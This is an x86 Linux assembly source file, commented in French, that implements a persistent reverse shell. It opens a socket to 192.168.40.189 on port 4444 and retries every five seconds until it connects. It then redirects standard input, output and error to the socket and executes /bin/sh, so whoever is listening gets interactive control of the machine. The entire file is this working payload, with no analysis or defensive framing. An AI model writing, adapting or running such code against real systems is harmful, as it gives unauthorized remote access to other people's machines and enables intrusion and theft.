section .data
    ; Définitions des constantes
    IP equ 0xBD28A8C0         ; 192.168.40.189 en format réseau (little endian)
    PORT equ 0x5c11           ; Port 4444 en format réseau (little endian)
    
    ; Chemin vers le shell
    shell db "/bin/sh", 0
    
    ; Constantes pour nanosleep
    RETRY_SECONDS equ 5       ; Nombre de secondes à attendre entre les tentatives

section .bss
    sockaddr resb 16          ; Structure pour stocker l'adresse du serveur
    timespec resb 8           ; Structure pour nanosleep (deux dwords)

section .text
    global _start

_start:
    ; Début du programme
    jmp socket_create

socket_create:
    ; Étape 1 : Créer un socket
    mov eax, 102        ; syscall socketcall
    mov ebx, 1          ; SYS_SOCKET
    push dword 0        ; IPPROTO_IP
    push dword 1        ; SOCK_STREAM
    push dword 2        ; AF_INET
    mov ecx, esp        ; ecx pointe vers les arguments
    int 0x80
    
    ; Vérifier si la création du socket a réussi
    test eax, eax
    js retry_connection ; Si erreur, attendre et réessayer
    
    mov edi, eax        ; Sauvegarder le descripteur de fichier du socket

socket_connect:
    ; Étape 2 : Configurer l'adresse du serveur
    ; Initialisation de la structure sockaddr_in
    mov dword [sockaddr], 0          ; Mise à zéro
    mov dword [sockaddr+4], 0        ; Mise à zéro
    mov dword [sockaddr+8], 0        ; Mise à zéro
    mov dword [sockaddr+12], 0       ; Mise à zéro
    
    mov word [sockaddr], 2           ; AF_INET (famille d'adresses)
    mov word [sockaddr+2], PORT      ; Port en format réseau
    mov dword [sockaddr+4], IP       ; Adresse IP en format réseau
    
    ; Étape 3 : Se connecter au serveur
    mov eax, 102        ; syscall socketcall
    mov ebx, 3          ; SYS_CONNECT
    
    ; Préparer les arguments pour connect()
    push dword 16       ; sizeof(sockaddr)
    push dword sockaddr ; &sockaddr
    push dword edi      ; sockfd (sauvegardé précédemment)
    
    mov ecx, esp        ; ecx pointe vers les arguments
    int 0x80
    
    ; Vérifier si la connexion a réussi
    test eax, eax
    js connection_failed
    
    ; La connexion a réussi, rediriger les flux et exécuter le shell
    jmp redirect_streams

connection_failed:
    ; Fermer le socket actuel avant de réessayer
    mov eax, 6          ; syscall close
    mov ebx, edi        ; descripteur de fichier du socket
    int 0x80
    
    ; Attendre avant de réessayer
    jmp retry_connection

retry_connection:
    ; Configurer la structure timespec pour nanosleep
    ; struct timespec {
    ;     time_t tv_sec;  /* secondes */
    ;     long   tv_nsec; /* nanosecondes */
    ; };
    mov dword [timespec], RETRY_SECONDS  ; tv_sec
    mov dword [timespec+4], 0            ; tv_nsec
    
    ; Appeler nanosleep
    mov eax, 162         ; syscall nanosleep
    mov ebx, timespec    ; adresse de la structure timespec
    mov ecx, 0           ; NULL (paramètre non utilisé)
    int 0x80
    
    ; Réessayer la connexion
    jmp socket_create

redirect_streams:
    ; Étape 4 : Rediriger stdin (0)
    mov eax, 63         ; syscall dup2
    mov ebx, edi        ; sockfd (sauvegardé dans edi)
    xor ecx, ecx        ; 0 (stdin)
    int 0x80
    
    ; Rediriger stdout (1)
    mov eax, 63         ; syscall dup2
    mov ebx, edi        ; sockfd
    mov ecx, 1          ; 1 (stdout)
    int 0x80
    
    ; Rediriger stderr (2)
    mov eax, 63         ; syscall dup2
    mov ebx, edi        ; sockfd
    mov ecx, 2          ; 2 (stderr)
    int 0x80
    
    ; Tous les flux standard sont maintenant redirigés vers le socket
    ; Exécuter le shell
    jmp execute_shell

execute_shell:
    ; Étape 5 : Exécuter le shell
    mov eax, 11         ; syscall execve
    
    ; Premier argument : chemin vers le programme
    mov ebx, shell      ; "/bin/sh"
    
    ; Deuxième argument : tableau d'arguments (argv)
    push dword 0        ; NULL (fin du tableau)
    push dword shell    ; "/bin/sh"
    mov ecx, esp        ; ecx pointe vers le tableau d'arguments
    
    ; Troisième argument : tableau d'environnement (envp)
    xor edx, edx        ; NULL (pas d'environnement)
    
    int 0x80
    
    ; Si execve réussit, le code suivant ne sera jamais exécuté
    ; Si nous arrivons ici, c'est qu'execve a échoué
    
exit:
    ; Sortir proprement
    mov eax, 1          ; syscall exit
    xor ebx, ebx        ; code de sortie 0
    int 0x80
